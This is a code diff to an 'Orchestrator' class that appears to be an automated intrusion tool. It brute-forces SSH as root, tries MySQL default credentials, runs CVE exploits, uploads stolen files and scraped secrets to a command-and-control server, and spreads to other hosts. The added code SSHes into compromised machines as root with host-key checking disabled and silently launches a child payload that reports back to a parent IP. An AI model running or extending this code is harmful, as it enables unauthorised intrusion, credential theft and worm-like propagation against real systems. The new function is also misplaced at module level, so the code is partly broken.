@@ -132,7 +132,7 @@ class Orchestrator:
             if svc['port'] == 22:
                 actions.append({'type': 'brute', 'target': ip, 'port': 22, 'user': 'root', 'pass': 'root'})
             if svc['port'] == 3306:
-                actions.append({'type': 'default_creds', 'target': ip, 'port': 3306, 'user': 'root', 'pass': ''})
+                actions.append({'type': 'try_default_creds', 'target': ip, 'port': 3306, 'user': 'root', 'pass': ''})
         return actions
 
     def _phase_escalate(self):
@@ -143,8 +143,8 @@ class Orchestrator:
             for action in target.get('actions', []):
                 if action['type'] == 'brute':
                     success = self.ap.brute_ssh(action['target'], action['user'], action['pass'])
-                elif action['type'] == 'default_creds':
-                    success = self.ap.default_creds(action['target'], action['port'])
+                elif action['type'] == 'try_default_creds':
+                    success = self.ap.try_default_creds(action['target'], action['port'])
                 elif action['type'] == 'cve':
                     success = self.ap.run_cve(action['target'], action['cve_id'])
                 else:
@@ -158,18 +158,34 @@ class Orchestrator:
                     # After compromise, we can also do deep digs on that host
                     # But we'll do that in exfiltrate
                     break
-
     def _phase_exfiltrate(self):
-        """Run file crawler and process scraper on compromised hosts (local)."""
-        # On the current host, run deep crawl
+        """Run deep crawler on compromised hosts (local AND remote)."""
+        # Local crawl
         findings = self.fc.crawl()
         for finding in findings:
             self.c2.upload_finding(finding)
-        # Process scraper
-        secrets = self.ps.scrape()
-        for secret in secrets:
-            self.c2.upload_finding(secret)
-        # Also, for each compromised host we might remote crawl (but that's future)
+        
+        # Remote deep crawl on compromised hosts
+        for ip in self.compromised:
+            if ip != self._get_local_ip():  # don't re-scan self
+                self._remote_deep_scan(ip)
+
+def _remote_deep_scan(self, ip):
+    """Run deep file crawler and process scraper on remote host."""
+    # SSH into compromised host and run the crawler
+    cmd = f"ssh -o StrictHostKeyChecking=no root@{ip} 'python3 /tmp/aetheric_install/main.py --child --parent-ip {self.parent_ip}'"
+    subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    # def _phase_exfiltrate(self):
+    #     """Run file crawler and process scraper on compromised hosts (local)."""
+    #     # On the current host, run deep crawl
+    #     findings = self.fc.crawl()
+    #     for finding in findings:
+    #         self.c2.upload_finding(finding)
+    #     # Process scraper
+    #     secrets = self.ps.scrape()
+    #     for secret in secrets:
+    #         self.c2.upload_finding(secret)
+    #     # Also, for each compromised host we might remote crawl (but that's future)
 
     def _phase_propagate(self):
         """Propagate to new targets discovered from findings."""
